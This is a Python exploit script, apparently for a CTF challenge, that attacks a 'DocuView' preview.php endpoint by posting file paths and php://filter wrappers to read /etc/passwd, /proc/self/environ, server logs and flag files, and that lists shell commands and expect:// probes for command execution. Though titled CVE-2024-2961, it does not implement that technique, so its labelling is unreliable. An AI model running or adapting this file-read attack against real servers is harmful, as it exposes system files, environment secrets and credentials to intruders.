#!/usr/bin/env python3
"""
DocuView CVE-2024-2961 简化版 Exploit
专门用于快速获取flag的简化版本
不依赖pwn和ten框架，可以独立运行

使用方法:
python exp_simple.py http://localhost:8080
"""

import requests
import base64
import sys
import re
import time
from urllib.parse import urljoin

class DocuViewExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.preview_url = urljoin(self.base_url + '/', 'preview.php')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def test_ssrf(self):
        """测试SSRF漏洞是否存在"""
        print("[*] 测试SSRF漏洞...")
        
        # 测试基本的文件读取
        test_paths = [
            '/etc/passwd',
            '/proc/version',
            'php://filter/convert.base64-encode/resource=/etc/hostname'
        ]
        
        for path in test_paths:
            try:
                data = {
                    'url': path,
                    'format': 'text',
                    'quality': 'high'
                }
                
                response = self.session.post(self.preview_url, data=data, timeout=10)
                
                if response.status_code == 200 and 'text-content' in response.text:
                    print(f"[+] SSRF漏洞确认，可以读取: {path}")
                    return True
                    
            except Exception as e:
                continue
                
        print("[-] SSRF漏洞测试失败")
        return False
    
    def read_file(self, file_path):
        """通过SSRF读取文件内容"""
        try:
            # 尝试直接读取
            data = {
                'url': file_path,
                'format': 'text',
                'quality': 'high'
            }
            
            response = self.session.post(self.preview_url, data=data, timeout=10)
            
            # 提取文本内容
            content_match = re.search(r'<div class="text-content"[^>]*>([^<]*)</div>', response.text, re.DOTALL)
            if content_match:
                content = content_match.group(1).strip()
                if content:
                    return content
            
            # 尝试使用base64编码读取
            filter_path = f"php://filter/convert.base64-encode/resource={file_path}"
            data['url'] = filter_path
            
            response = self.session.post(self.preview_url, data=data, timeout=10)
            content_match = re.search(r'<div class="text-content"[^>]*>([^<]+)</div>', response.text, re.DOTALL)
            
            if content_match:
                encoded_content = content_match.group(1).strip()
                try:
                    decoded = base64.b64decode(encoded_content).decode('utf-8', errors='ignore')
                    return decoded
                except:
                    return encoded_content
                    
        except Exception as e:
            print(f"[!] 读取文件失败 {file_path}: {e}")
            
        return None
    
    def find_flag(self):
        """尝试找到flag"""
        print("[*] 开始寻找flag...")
        
        # 常见的flag位置
        flag_paths = [
            '/flag',
            '/flag.txt', 
            '/root/flag',
            '/root/flag.txt',
            '/home/flag',
            '/home/flag.txt',
            '/var/www/flag',
            '/var/www/flag.txt',
            '/var/www/html/flag',
            '/var/www/html/flag.txt',
            '/tmp/flag',
            '/tmp/flag.txt'
        ]
        
        for flag_path in flag_paths:
            print(f"[*] 尝试读取: {flag_path}")
            content = self.read_file(flag_path)
            
            if content and ('flag{' in content.lower() or 'lzctf{' in content.lower() or content.startswith('LZCTF{')):
                print(f"[+] 找到flag: {content.strip()}")
                return content.strip()
            elif content:
                print(f"[*] 文件存在但可能不是flag: {content[:100]}...")
        
        # 尝试通过环境变量获取flag
        print("[*] 尝试通过环境变量获取flag...")
        env_content = self.read_file('/proc/self/environ')
        if env_content:
            # 环境变量通常以\x00分隔
            env_vars = env_content.replace('\x00', '\n').split('\n')
            for var in env_vars:
                if 'flag' in var.lower() and '=' in var:
                    print(f"[+] 环境变量中找到flag: {var}")
                    return var.split('=', 1)[1]
        
        # 尝试执行命令查找flag
        print("[*] 尝试通过命令执行查找flag...")
        return self.try_command_execution()
    
    def try_command_execution(self):
        """尝试命令执行来查找flag"""
        # 这里可以尝试各种RCE技巧
        # 由于CVE-2024-2961比较复杂，这里提供一些简单的尝试
        
        commands = [
            'find / -name "*flag*" 2>/dev/null',
            'cat /flag 2>/dev/null || cat /root/flag 2>/dev/null || cat /home/*/flag 2>/dev/null',
            'env | grep -i flag',
            'ls -la / | grep flag'
        ]
        
        for cmd in commands:
            print(f"[*] 尝试执行命令: {cmd}")
            
            # 尝试通过各种方式执行命令
            # 这里只是示例，实际的CVE-2024-2961利用会更复杂
            try:
                # 使用expect://协议尝试
                expect_payload = f"expect://id"
                result = self.read_file(expect_payload)
                if result:
                    print(f"[*] expect://协议可用: {result}")
                
                # 尝试其他协议
                protocols = ['file://', 'php://input', 'php://stdin']
                for protocol in protocols:
                    test_result = self.read_file(protocol)
                    if test_result:
                        print(f"[*] {protocol} 协议可用")
                        
            except Exception as e:
                continue
        
        return None
    
    def exploit(self):
        """主要的漏洞利用函数"""
        print(f"[*] 开始DocuView漏洞利用")
        print(f"[*] 目标: {self.base_url}")
        print(f"[*] 预览URL: {self.preview_url}")
        
        # 测试连接
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code != 200:
                print(f"[-] 无法连接到目标: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] 连接失败: {e}")
            return False
        
        print("[+] 目标连接成功")
        
        # 测试SSRF
        if not self.test_ssrf():
            print("[-] SSRF漏洞利用失败")
            return False
        
        # 查找flag
        flag = self.find_flag()
        if flag:
            print(f"\n[+] 成功获取flag: {flag}")
            return True
        else:
            print("\n[-] 未能获取flag")
            return False
    
    def info_gathering(self):
        """信息收集"""
        print("[*] 开始信息收集...")
        
        info_files = {
            '/etc/passwd': 'System users',
            '/proc/version': 'Kernel version', 
            '/proc/cpuinfo': 'CPU info',
            '/etc/os-release': 'OS release',
            '/proc/self/cmdline': 'Current process command line',
            '/proc/self/cwd': 'Current working directory',
            '/var/log/apache2/access.log': 'Apache access log',
            '/var/log/nginx/access.log': 'Nginx access log'
        }
        
        for file_path, description in info_files.items():
            print(f"[*] 读取 {description}: {file_path}")
            content = self.read_file(file_path)
            if content:
                print(f"[+] {description}:")
                print(content[:200] + ('...' if len(content) > 200 else ''))
                print("-" * 50)

def main():
    if len(sys.argv) != 2:
        print("使用方法: python exp_simple.py <target_url>")
        print("示例: python exp_simple.py http://localhost:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print("DocuView CVE-2024-2961 简化版漏洞利用工具")
    print("=" * 50)
    
    exploit = DocuViewExploit(target_url)
    
    # 可选：进行信息收集
    if input("是否进行信息收集? (y/N): ").lower() == 'y':
        exploit.info_gathering()
    
    # 执行漏洞利用
    success = exploit.exploit()
    
    if success:
        print("\n[+] 漏洞利用成功!")
        sys.exit(0)
    else:
        print("\n[-] 漏洞利用失败")
        sys.exit(1)

if __name__ == "__main__":
    main()